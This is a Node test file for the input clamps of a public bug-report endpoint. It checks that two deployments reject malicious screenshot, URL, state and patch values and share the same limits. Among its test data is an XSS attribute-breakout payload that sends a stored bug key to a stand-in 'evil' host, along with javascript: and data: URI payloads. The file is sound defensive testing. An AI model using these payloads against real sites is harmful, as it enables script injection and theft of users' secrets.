// Input clamps for the PUBLIC, unauthenticated POST /api/bug.
//
// The two deployments (Cloudflare Worker + Netlify Function) each carry their own copy of these
// helpers, so this asserts BOTH and that they agree — a drift means one host stores what the other
// rejects, and the /bugs/ dashboard renders whatever it is given.
//
//   node test/bugapi.test.mjs
import * as fs from 'fs';
import * as path from 'path';
import { fileURLToPath, pathToFileURL } from 'url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const N = await import(pathToFileURL(path.join(ROOT, 'netlify/lib/bugstore.mjs')).href);

// the Worker is a default-export module; pull its clamp helpers out by evaluating the prelude
const workerSrc = fs.readFileSync(path.join(ROOT, 'deploy/worker.js'), 'utf8');
const prelude = workerSrc.slice(0, workerSrc.indexOf('export default'));
const W = await import('data:text/javascript,' + encodeURIComponent(
  prelude + '\nexport { MAX_BODY, MAX_SHOT, MAX_STATE, safeShot, safeUrl, clampState, sanitizePatch, STATUSES };'));

let pass = 0, fail = 0;
const ok = (c, m) => { if (c) { pass++; console.log('  ✓ ' + m); } else { fail++; console.log('  ✗ ' + m); } };
const both = (fn, arg) => [W[fn](arg), N[fn](arg)];
const agree = (fn, arg, want, m) => {
  const [w, n] = both(fn, arg);
  const same = JSON.stringify(w) === JSON.stringify(n);
  ok(same && JSON.stringify(w) === JSON.stringify(want), `${m}${same ? '' : '  [WORKER/NETLIFY DISAGREE]'}`);
};

console.log('\nbug API input clamps\n' + '-'.repeat(52));

// --- shot: must be an inline raster image ------------------------------------------------------
const png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==';
agree('safeShot', png, png, 'accepts a data:image/png snapshot');
agree('safeShot', 'data:image/jpeg;base64,/9j/4AAQ', 'data:image/jpeg;base64,/9j/4AAQ', 'accepts data:image/jpeg');
// the actual XSS payload: closes the src attribute and adds a handler
agree('safeShot', 'x" onerror="fetch(`//evil/?k=`+localStorage.chucky_bugkey)', null, 'REJECTS attribute-breakout payload');
agree('safeShot', 'data:text/html;base64,PHNjcmlwdD4=', null, 'REJECTS data:text/html');
agree('safeShot', 'javascript:alert(1)', null, 'REJECTS javascript: URI');
agree('safeShot', 'https://evil.example/x.png', null, 'REJECTS remote image URL');
agree('safeShot', 42, null, 'REJECTS non-string');
ok(W.safeShot('data:image/png;base64,' + 'A'.repeat(W.MAX_SHOT)) === null, 'REJECTS oversize snapshot');

// --- url: http(s) only -------------------------------------------------------------------------
agree('safeUrl', 'https://example.com/capiche/', 'https://example.com/capiche/', 'accepts https');
agree('safeUrl', 'http://localhost:3008/aiko/', 'http://localhost:3008/aiko/', 'accepts http');
agree('safeUrl', 'javascript:alert(document.cookie)', '', 'REJECTS javascript:');
agree('safeUrl', 'data:text/html,<script>x</script>', '', 'REJECTS data:');
agree('safeUrl', 'not a url', '', 'REJECTS malformed');
agree('safeUrl', null, '', 'REJECTS null');
ok(W.safeUrl('https://e.com/' + 'a'.repeat(500)).length <= 300, 'bounds url length');

// --- state: bounded --------------------------------------------------------------------------
agree('clampState', { edits: { a: 1 } }, { edits: { a: 1 } }, 'keeps a normal state object');
agree('clampState', null, null, 'null state stays null');
agree('clampState', 'a string', null, 'REJECTS non-object state');
const huge = { blob: 'x'.repeat(W.MAX_STATE + 10) };
ok(W.clampState(huge).truncated === true && N.clampState(huge).truncated === true,
   'REPLACES oversize state with a truncation marker (was unbounded)');

// --- update route: only triage fields are writable ---------------------------------------------
// The update route is key-gated but used to Object.assign the body straight onto the record, so a
// key-holder could bypass every POST clamp above. These assert the allowlist, on both deployments.
agree('sanitizePatch', { status: 'fixed' }, { status: 'fixed' }, 'accepts a valid status');
agree('sanitizePatch', { status: 'needs-auth', approved: true }, { status: 'needs-auth', approved: true }, 'accepts status + approved');
agree('sanitizePatch', { status: 'not-a-status' }, {}, 'REJECTS an unknown status');
agree('sanitizePatch', { shot: 'x" onerror="alert(1)' }, {}, 'REJECTS re-injecting a shot');
agree('sanitizePatch', { url: 'javascript:alert(1)' }, {}, 'REJECTS re-injecting a url');
agree('sanitizePatch', { id: 'bug_other' }, {}, 'REJECTS overwriting the record id');
agree('sanitizePatch', { t: 'not-a-number' }, {}, 'REJECTS breaking the TTL timestamp');
agree('sanitizePatch', { state: { huge: 1 } }, {}, 'REJECTS re-inflating state');
agree('sanitizePatch', { approved: 'yes' }, {}, 'REJECTS a non-boolean approved');
ok(W.sanitizePatch({ resolution: 'x'.repeat(5000) }).resolution.length === 2000, 'bounds resolution length');

// --- the two deployments agree on limits -------------------------------------------------------
ok(W.MAX_BODY === N.MAX_BODY && W.MAX_SHOT === N.MAX_SHOT && W.MAX_STATE === N.MAX_STATE,
   'Worker and Netlify limits are identical');

console.log('-'.repeat(52));
console.log(`  ${pass} passed, ${fail} failed\n`);
process.exit(fail ? 1 : 0);
